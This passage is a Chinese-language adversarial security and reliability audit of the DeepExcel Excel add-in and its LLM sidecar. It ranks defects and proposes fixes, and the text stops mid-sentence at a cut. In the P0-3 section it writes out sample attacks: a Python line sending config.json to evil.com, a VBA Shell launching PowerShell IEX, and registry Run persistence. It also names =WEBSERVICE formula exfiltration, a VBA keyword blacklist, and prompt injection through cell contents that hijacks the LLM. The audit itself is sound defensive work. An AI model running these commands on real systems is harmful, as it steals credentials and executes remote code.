# DeepExcel 对抗式审查报告（第一轮 · 4 视角交叉验证）

- 审查日期：2026-06-29
- 审查范围：DeepExcel 全项目（C# AddIn / Python Sidecar / 前端 UI）
- 审查方式：4 个独立对抗式 agent 并行（安全 / 可靠性 / 协议一致性 / Agent Loop），交叉验证
- 目的：定位真实缺陷供开发 agent 修复

---

## 修复优先级总表

| 优先级 | 编号 | 问题 | 文件 | 修复成本 | 阻断场景 |
|---|---|---|---|---|---|
| P0 | P0-1 | `write_value` 未注册到 MCP server | `src/DeepExcel.Sidecar/excel_tools.py:309-327` | 1 行 | 文本写入必失败（用户已投诉） |
| P0 | P0-2 | `SecurityGateway` 完全未接线 | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:283-345` | 低 | 高风险操作无二次验证 |
| P0 | P0-3 | `execute_python`/`execute_vba` 无沙箱 | `src/DeepExcel.AddIn/Executor/PythonExecutor.cs:258-301`、`VBAExecutor.cs:159-169` | 高 | LLM 任意 RCE |
| P0 | P0-4 | API Key 明文存储，DPAPI 是死代码 | `src/DeepExcel.AddIn/Config/AppConfig.cs:192-200`、`Bridge/MessageBridge.cs:111-116` | 中 | 密钥窃取 |
| 崩溃 | C-1 | `HandleToolCall` 是 `async void` 且 `SendToolResult` 在 try-catch 外 | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:283-345` | 中 | Excel 崩溃 |
| 崩溃 | C-2 | `_uiControl.Invoke` 同步阻塞 → 模态对话框死锁 | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:308-318` | 中 | Excel 未响应 |
| 崩溃 | C-3 | `foreach (Range cell in range.Cells)` 不释放 RCW | `src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs:592`、`Tools/DataCleaner.cs:33,138,176,214,263` | 中 | 大范围操作句柄耗尽 |
| 崩溃 | C-4 | sidecar 进程退出无 `_process.Exited` 订阅 | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:80-87` | 低 | UI 永久转圈 5 分钟 |
| 崩溃 | C-5 | `MessageBridge` 全部 JSON 序列化未用 `_jsonOptions` | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:147,339-357` | 中 | 2D 数组 NotSupportedException 崩溃（定时炸弹） |
| 协议 | P-1 | `apply_conditional_format` 的 `rule_args` JsonElement 未转换 | `src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs:286-290` | 低 | 条件格式参数静默丢弃 |
| 协议 | P-2 | cancel 不清理 `_pendingClarifyQuestion` | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:327-332` | 1 行 | 吞下一条用户消息 |
| 协议 | P-3 | `_wrap_result` 不设 `is_error=true` | `src/DeepExcel.Sidecar/excel_tools.py:7-13` | 低 | LLM 死循环重试失败工具 |
| 协议 | P-4 | `{excel_context}` 占位符从未被替换 + `context`/`session_id` 被丢弃 | `src/DeepExcel.Sidecar/sidecar.py:130,245` | 中 | LLM 对 Excel 状态一无所知 |
| 协议 | P-5 | `call_csharp` 无超时 | `src/DeepExcel.Sidecar/ipc.py:108-116` | 低 | C# 卡死时 sidecar 永久 hang |
| 安全 | H-1 | 前端可直接发 `execute_vba`/`execute_tool` 绕过 LLM | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:158-159,247-268` | 低 | XSS → VBA RCE |
| 安全 | H-2 | `write_formula` 无公式黑名单 | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:476-488` | 中 | `=WEBSERVICE(...)` 数据外泄 |
| 安全 | H-3 | 无 prompt 注入防御条款 | `src/DeepExcel.Sidecar/system_prompt.py` | 低 | 单元格内容劫持 LLM |
| 安全 | H-4 | DPAPI 失败 fail-open 回退明文 | `src/DeepExcel.AddIn/Security/SecurityManager.cs:46,64` | 低 | 边界加固 |
| 安全 | H-5 | `GenerateVerificationCode` 用非加密 Random | `src/DeepExcel.AddIn/Security/SecurityManager.cs:140-150` | 低 | 验证码可预测 |
| 严重 | S-1 | `_isBusy` 是死代码，`OnTogglePanel` 从不检查 | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:31-53`、`ThisAddIn.cs:260-358` | 低 | 响应期间关面板导致流中断 |
| 严重 | S-2 | `SetupBridgeBroadcast` 标志提前设置 | `src/DeepExcel.AddIn/ThisAddIn.cs:509-575` | 低 | sidecar 启动失败后无恢复 |
| 严重 | S-3 | `SafeBeginInvoke` 句柄未创建时丢弃 `stream_end` | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:261-281` | 低 | UI 永久转圈 |
| 严重 | S-4 | `RangeAnalyzer.GetNumberFormats` 多单元格统一格式返回空 | `src/DeepExcel.AddIn/Perception/RangeAnalyzer.cs:79-95` | 低 | 模型获取不到数字格式 |
| 协议 | P-6 | `OnError` 链路完全断裂（死代码） | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:50,196-240`、`SidecarProtocol.cs:9-22`、`Bridge/MessageBridge.cs:78,308-312` | 低 | 错误无红色高亮 |
| 协议 | P-7 | `stream_end` cancel 路径 payload 字段不一致 | `src/DeepExcel.AddIn/Bridge/MessageBridge.cs:302-306,334-337` | 1 行 | StatusBar token 显示 undefined |
| 协议 | P-8 | `ResultMessage.subtype`/`is_error`/`num_turns` 被丢弃 | `src/DeepExcel.Sidecar/sidecar.py:101-116` | 低 | max_turns 耗尽时无提示 |
| 协议 | P-9 | cancel 后 SDK client 状态可能脏 | `src/DeepExcel.Sidecar/sidecar.py:140-162,258` | 中 | 下一轮 query 异常 |
| 中 | M-1 | `OnDisconnection` UI 线程同步等 sidecar 2 秒 | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:92-108` | 低 | Excel 关闭卡顿 |
| 中 | M-2 | `PythonSidecar._process` 从不 Dispose | `src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs:80,110` | 1 行 | 内核句柄泄漏 |
| 中 | M-3 | `RangeAnalyzer.GetFormulas` 硬编码 1-based | `src/DeepExcel.AddIn/Perception/RangeAnalyzer.cs:68` | 低 | 防御性编程缺失 |
| 中 | M-4 | `ChartTool.CreateChart` COM 链不释放 | `src/DeepExcel.AddIn/Tools/ChartTool.cs:35-92` | 中 | 长期运行句柄累积 |
| 中 | M-5 | `DataCleaner.RemoveDuplicates` 删行后访问失效索引 | `src/DeepExcel.AddIn/Tools/DataCleaner.cs:94-106` | 低 | 大量重复行时抛异常 |
| 中 | M-6 | `OperationHistoryManager.SaveCurrentSession` 路径穿越 | `src/DeepExcel.AddIn/Collaboration/OperationHistory.cs:91-97` | 1 行 | 未来暴露后可写任意位置 |
| 低 | L-1 | `register-user.ps1` 注册前未清理 CLSID 项 | `scripts/register-user.ps1:115-116,40-72` | 低 | CLSID 劫持 |
| 低 | L-2 | COM 加载项不校验调用方身份 | `src/DeepExcel.AddIn/ThisAddIn.cs:93-111,249-258` | 低 | Word VBA 可实例化 |
| 低 | L-3 | WebView2 禁用 `RendererCodeIntegrity` | `src/DeepExcel.AddIn/ThisAddIn.cs:389-392` | 低 | 渲染器隔离削弱 |
| 低 | L-4 | `Logger` 公式日志可能泄露敏感数据 | `src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs:88` | 低 | 日志读取外泄 |
| 低 | L-5 | 根目录 `DeepExcelRibbon.xml`/`.cs` 是 VSTO 死代码 | `src/DeepExcel.AddIn/DeepExcelRibbon.xml`、`DeepExcelRibbon.cs` | 删除 | 维护者误导 |
| 低 | L-6 | `connection_ok` 仅 dev 发送，生产 StatusBar 永远"连接中" | `src/DeepExcel.UI/src/bridge.ts:50` | 低 | UX |

---

## P0 问题详情（必须立即修复）

### P0-1 `write_value` 未注册到 MCP server

**交叉验证**：3 个独立 agent（安全 / 协议 / Agent Loop）同时命中。

**证据链**：
- [excel_tools.py:36](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/excel_tools.py) `@tool("write_value", ...)` 装饰器已声明
- [excel_tools.py:309-327](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/excel_tools.py) `register_all_tools()` 返回列表**未包含** `write_value`
- [sidecar.py:223](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/sidecar.py) `create_sdk_mcp_server(name="excel", tools=register_all_tools())` 只接收列表内工具
- [sidecar.py:231](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/sidecar.py) `allowed_tools` 含 `mcp__excel__write_value`（形同虚设）
- [system_prompt.py:21-25](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.Sidecar/system_prompt.py) 强制要求"写文本必须用 write_value"
- [ToolDispatcher.cs:96-131](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/ToolDispatcher.cs) C# 端已实现
- [IExcelActions.cs:24](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/IExcelActions.cs) 接口已声明

**运行时后果**：
LLM 被 system_prompt 告知"必须用 write_value 写文本"，但 MCP server 不认识 → LLM 收到 "tool not found" → 回退 `write_formula` → 写"张三"变成 `="张三"`（Excel 自动按公式解析）。**直接对应 2026-06-29 用户投诉**。

**修复**：在 `register_all_tools()` 第 314 行 `write_formula,` 之后加入 `write_value,`。同步验证 `@tool` 类型规约 `{"value": str}` 与 C# 端支持 int/double/bool 不一致，建议改 `{"value": object}` 或在 Python 端做 JsonElement 兜底。

---

### P0-2 `SecurityGateway` 完全未接线

**证据**：
- [SecurityGateway.cs](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Security/SecurityGateway.cs) 定义 `HighRiskTools = {"execute_vba", "execute_python", "rollback", "clean_data", "remove_duplicates"}` 并实现 `ExecuteWithSecurityCheck`
- 全代码库 grep：无任何位置 `new SecurityGateway()` 或调用 `ExecuteWithSecurityCheck`
- [PythonSidecar.cs:283-345](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) `HandleToolCall → ToolDispatcher.Execute` 直接调用
- 设计文档 [2026-06-26-deepexcel-claude-sdk-migration-design.md:263](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/docs/superpowers/specs/2026-06-26-deepexcel-claude-sdk-migration-design.md) 声明的"高风险操作二次验证"在实现中不存在

**修复**：在 `PythonSidecar.HandleToolCall` 中根据 `toolName` 调用 `SecurityGateway.RequestVerification`，未批准则直接 `SendToolResult(success=false)`；或彻底移除 `SecurityGateway` 死代码。

---

### P0-3 `execute_python`/`execute_vba` 无沙箱

**`execute_python`**：[PythonExecutor.cs:258-301](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Executor/PythonExecutor.cs) `BuildScriptWithContext` 第 292 行直接 `sb.AppendLine(userCode)`，通过 `Process.Start(python, tempScript)` 执行。可任意 `import os/subprocess/socket/urllib`，30 秒超时只限时间不限能力。

**`execute_vba`**：[VBAExecutor.cs:159-169](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Executor/VBAExecutor.cs) `ExtractProcedureBody` 把 LLM 提供的 `vbaCode` 包成 `Sub DeepExcel_TempMacro()...End Sub` 后 `_app.Run()`。VBA 可 `Shell`、`CreateObject("WScript.Shell")` 写注册表、`CreateObject("MSXML2.XMLHTTP")` 发 HTTP、`Kill` 删文件。

**攻击场景**：
- 数据外泄：`import urllib.request; urllib.request.urlopen("http://evil.com/?d="+open(r"...config.json").read().hex())`
- RCE：`Shell "cmd /c powershell -c IEX ..."`
- 持久化：写 `HKCU\...\Run\evil`

**修复**：用 RestrictedPython AST 白名单（拒绝 `import os/subprocess/socket/urllib`）；或 Windows AppContainer/Job Object 限制；或直接移除 `execute_python` 强制走 `write_formula`。VBA 同理用关键字黑名单（`Shell/CreateObject/Environ/Kill/Name/Open/Print/Reg`）。

---

### P0-4 API Key 明文存储

**证据**：
- [AppConfig.cs:60-69](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Config/AppConfig.cs) `ProviderConfig.ApiKey` 是明文字段
- [AppConfig.cs:192-200](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Config/AppConfig.cs) `UpdateApiKey` 直接写明文到 `%APPDATA%\DeepExcel\config.json`
- [AppConfig.cs:146-166](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Config/AppConfig.cs) `Save` 序列化全配置（含明文 key）
- [MessageBridge.cs:111-116](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Bridge/MessageBridge.cs) fallback 用明文 `provider.ApiKey`
- `SecurityManager.SaveApiKey` 从未被调用，DPAPI 加密路径完全是死代码

**攻击场景**：任何同用户进程（含被 P0-3 启动的子进程）`open(r"...config.json").read()` 即可窃取 API Key。

**修复**：删除 `ProviderConfig.ApiKey` 字段；`UpdateApiKey` 改为调用 `SecurityManager.Instance.SaveApiKey`；`SendConfigToSidecar` 移除 `provider.ApiKey` fallback；迁移已有明文 key 到 DPAPI 加密存储后清除 config.json 中 ApiKey 字段。

---

## 崩溃级问题详情

### C-1 `HandleToolCall` 异常未捕获

[PythonSidecar.cs:283-345](file:///c:/Users/qinju/Desktop/AIProject/DeepExcel/src/DeepExcel.AddIn/Sidecar/PythonSidecar.cs) 是 `async void`，`SendToolResult` 调用（第 337 行）在 try-catch 之外。fallback 自身的 `JsonSerializer.Serialize(safeMsg, _jsonOptions)` 在 OOM 场景仍可能抛。`async void` 未捕获异常 → `AppDomain.UnhandledException` → Excel 进程崩溃。

**修复**：整个方法体包